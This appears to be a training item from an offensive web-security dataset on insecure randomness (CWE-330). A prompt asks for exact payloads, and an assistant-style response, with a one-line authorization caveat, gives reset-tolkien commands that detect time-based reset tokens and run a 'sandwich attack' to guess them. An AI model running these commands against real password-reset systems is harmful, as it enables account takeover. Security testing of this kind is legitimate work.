# UPLOAD — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: upload
- cwe: CWE-330

## Scenario

Show me how Tools works in the context of Insecure Randomness, including the exact payloads/commands.

## Analysis / Response

**Tools** — this technique applies to Insecure Randomness. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

Generic identification and sandwich attack:

* [AethliosIK/reset-tolkien](https://github.com/AethliosIK/reset-tolkien) - Insecure time-based secret exploitation and Sandwich attack implementation Resources

    ```ps1
    reset-tolkien detect 660430516ffcf -d "Wed, 27 Mar 2024 14:42:25 GMT" --prefixes "attacker@example.com" --suffixes "attacker@example.com" --timezone "-7"
    reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt --token-format="uniqid"
    ```
